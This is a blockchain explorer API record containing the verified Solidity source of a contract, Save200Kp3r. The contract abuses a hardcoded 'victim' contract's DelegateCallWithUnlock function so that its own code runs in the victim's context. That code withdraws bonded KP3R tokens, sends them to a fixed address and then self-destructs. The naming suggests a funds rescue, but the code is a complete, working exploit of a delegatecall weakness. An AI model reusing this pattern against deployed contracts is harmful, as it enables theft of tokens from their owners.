{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: NONE\n\npragma solidity 0.8.1;\n\n\n\n// Part: IErc20\n\ninterface IErc20 {\n    function approve(address, uint256) external returns (bool);\n\n    function transfer(address, uint256) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n    function allowance(address _owner, address _spender) external view returns (uint256 remaining);\n}\n\n// Part: IKp3r\n\ninterface IKp3r {\n    function withdraw(address bonding) external;\n    function resolve(address keeper) external;\n    function dispute(address keeper) external;\n    function balanceOf(address keeper) view external returns (uint256);\n\n}\n\n// Part: IVictimContract\n\ninterface IVictimContract {\n    function Unlock(uint256 b) external ;\n   \n    function DelegateCallWithUnlock(address target,bool allowRevert, bytes memory data) external returns (bytes memory response);\n  \n\n}\n\n// File: Save200Kp3r.sol\n\ncontract Save200Kp3r  {\n\n  \n    address private constant _deployer = 0x8CC1cFdc1C60C19a1d7C0fa3c042a4916AA79a51;\n    address private constant  _victim=0xdd0fBEcCba0aA4Cc56b861D514e09f49Bcc6D0C5;\n    address private constant  _sendRestTo=0x661047E7f94450D8a0C5d82FAd0E93f5ad681914;\n    address private constant _kp3r = 0x1cEB5cB57C4D4E2b2433641b95Dd330A33185A44;\n    event Log(address);\n\n    constructor()  {\n    \n    }\n\n    \n    function Withdraw() public {\n        IVictimContract(_victim).Unlock(block.number);\n        bytes memory data=abi.encodeWithSignature(\"WithdrawInternal()\");\n        bytes memory data2=abi.encodeWithSignature(\"DelegateCallWithUnlock(address,bool,bytes)\",address(this),false,data);\n        uint256 balanceBefore=IErc20(_kp3r).balanceOf(_sendRestTo);\n        _victim.call(data2);\n\n        uint256 balanceAfter=IErc20(_kp3r).balanceOf(_sendRestTo);\n        if(balanceBefore==balanceAfter){ \n            revert(\"tokens not arrived\");//just in case to return tokens back to bond address \n        }\n        selfdestruct(payable(_sendRestTo));\n    }\n\n    //executes in VICTIM contract context\n    function WithdrawInternal()  public  {\n     \n        IKp3r(_kp3r).withdraw(_kp3r);\n        uint256 balance=IErc20(_kp3r).balanceOf(address(this));\n        IErc20(_kp3r).transfer(_sendRestTo,balance);//no funds on Save200Kp3r - so it is safe\n        //selfdestruct(payable(_sendRestTo)); //Destruct victim contract\n     }\n\n   \n   \n}\n","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"WithdrawInternal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"Save200Kp3r","CompilerVersion":"v0.8.1+commit.df193b15","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":""}]}